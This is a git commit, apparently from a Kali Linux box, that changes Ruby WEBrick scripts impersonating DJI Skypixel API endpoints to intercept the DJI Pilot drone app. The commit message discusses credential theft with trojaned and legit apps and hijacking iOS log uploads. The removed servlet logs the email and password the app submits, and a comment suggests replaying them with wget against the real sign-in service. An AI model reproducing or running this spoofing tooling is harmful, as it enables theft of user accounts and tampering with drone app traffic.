1d92319d8fc78cd0f9852275d4cbfcfdd7c0994b
root <root@kali.(none)>
2015-02-03 13:27:36 +0000

    Add HTTP support for the *legit* Android app. Previous tests were done with a *trojaned* version. iOS appears to be ignoring the self-signed certificate unfortunately. This could be an Android specific issue. (Credential theft) It will still be possible to hijack the iOS http connection for log file down / uploads

--- snarf.sh
+++ snarf.sh
@@ -1,3 +1,4 @@
 #/bin/sh
 ruby www_skypixel.rb & 
+ruby secure_www_skypixel.rb & 
 ruby 9090_logs.rb &
--- www_skypixel.rb
+++ www_skypixel.rb
@@ -1,54 +1,9 @@
 require 'webrick'
 include WEBrick
 
-s = HTTPServer.new( :Port => 80, Logger: WEBrick::Log.new("/dev/null"), AccessLog: [] )
-#s = HTTPServer.new( :Port => 80, Logger: WEBrick::Log.new("/dev/null") )
+s = HTTPServer.new( :Port => 80, Logger: WEBrick::Log.new("/dev/null") )
 
-puts "DJI Pilot.app profile jacker has launched"
-
-SIGN_IN_LOVE = '{"status":0,"status_msg":"ok","token":"thisisabullshittoken","avatar":"http://rs1img.memecdn.com/dat-troll-meme-i-made-with-my-extreme-paint-skills_o_721540.jpg"}'
-
-class SIGN_IN < HTTPServlet::AbstractServlet
- def do_POST(req, res)
-   res.body = SIGN_IN_LOVE
-   res['Content-Type'] = "application/json; charset=utf-8"
-   puts "DJI Pilot.app sent a sign_in request with these credentials: #{req.body}"
-# email=xxxxx&password=xxxxxx
-#   username = 
-#   password = 
-# Test the password here, obtain *legit* token and download *real* logs?
-#  wget --post-data "email=realuser%40gmail.com&password=realpass" https://www.skypixel.com/api/sign_in
- end
-end
-
-PROFILE_MY_LOVE = '{"status":0,"status_msg":"ok",' +
-'"id":14963,"email":"realuser@gmail.com","show_name":"Troll Bagginz",' +
-'"first_name":"Troll","last_name":"Bagginz","webpage":null,"country":"Deez Nuts",' +
-'"country_code":"US","state":"Confusion ","city":"Trollville ","created_at":"1999-01-10T23:13:37.000Z",' +
-'"bio":null,"about":null,"likes_count":0,"favorites_count":0,"photos_count":0,"videos_count":0,"gender":"male","account_type":null,' +
-'"facebook_url":null,"pinterest_url":null,"tumblr_url":null,"twitter_url":null,' +
-'"avatar":"http://rs1img.memecdn.com/dat-troll-meme-i-made-with-my-extreme-paint-skills_o_721540.jpg","active_info":[{"sn":"0123456789","deviceType":"1","productType":"inspire1",' +
-'"email":"realuser@gmail.com","appVersion":"0.9.1","deviceName":"Monkey Dicks","activeday":"2015-01-30","ip":"1.2.3.4",' +
-'"firmwareVersion":"01.13"}]}'
-
-class PROFILES_MY < HTTPServlet::AbstractServlet
- def do_GET(req, res)
-   res.body = PROFILE_MY_LOVE
-   res['Content-Type'] = "application/json; charset=utf-8"
-   puts "DJI Pilot.app sent a profile view request for Profile Token: #{req.query_string}"
- end
-end
-
-#LOGOUT_JSON_LOVE = '{"status":315,"status_msg":"no member login!"}'
-LOGOUT_JSON_LOVE = '{"status":0,"status_msg":"ok"}'
-
-class LOGOUT_JSON < HTTPServlet::AbstractServlet
- def do_GET(req, res)
-   res.body = LOGOUT_JSON_LOVE
-   res['Content-Type'] = "application/json; charset=utf-8"
-   puts "DJI Pilot.app sent a logout request for Profile Token: #{req.query_string}"
- end
-end
+puts "DJI Pilot.app http service has launched"
 
 #o = [('a'..'z'), ('0'..'9')].map { |i| i.to_a }.flatten
 o = [('0'..'9')].map { |i| i.to_a }.flatten
@@ -74,7 +29,7 @@ LINKS_PLIOT_LOVE = '{"application":
 "announcement":
     {
         "guid":"23A20DCF-8410-2A07-23EE-175021762213",
-        "en":"Propeller Locks\n\nThe Inspire 1â€™s propellers may come off during flight if they are not correctly hand tightened and environmental factors (including sand, heavy dust, or high winds) cause the motors slow down suddenly. To prevent this, DJI is offering free Propeller Locks to all Inspire 1 customers.\n\nIf you ordered your Inspire 1 from the DJI Online Store, they will automatically be shipped to you. If you purchased your Inspire 1 at an authorized DJI dealer, you can collect them there. These Propeller Locks will become available next week, and DJI recommends that you do not attempt flying your Inspire 1 before receiving and attaching the Propeller Locks."
+        "en":"Propeller Locks\n\nThe Inspire 1propellers may come off during flight if they are not correctly hand tightened and environmental factors (including sand, heavy dust, or high winds) cause the motors slow down suddenly. To prevent this, DJI is offering free Propeller Locks to all Inspire 1 customers.\n\nIf you ordered your Inspire 1 from the DJI Online Store, they will automatically be shipped to you. If you purchased your Inspire 1 at an authorized DJI dealer, you can collect them there. These Propeller Locks will become available next week, and DJI recommends that you do not attempt flying your Inspire 1 before receiving and attaching the Propeller Locks."
     },
 "versionlist":
     [
@@ -188,9 +143,6 @@ end
 # 192.168.1.248 - - [01/Feb/2015:03:19:25 EST] "GET /favicon.ico HTTP/1.1" 404 282
 
 trap("INT"){ s.shutdown }
-s.mount("/api/sign_in", SIGN_IN)
-s.mount("/api/profiles/my", PROFILES_MY)
-s.mount("/api/logout.json", LOGOUT_JSON)
 s.mount("/getday", GETDAY)
 s.mount("/redirect/links/pliot", LINKS_PLIOT)
 
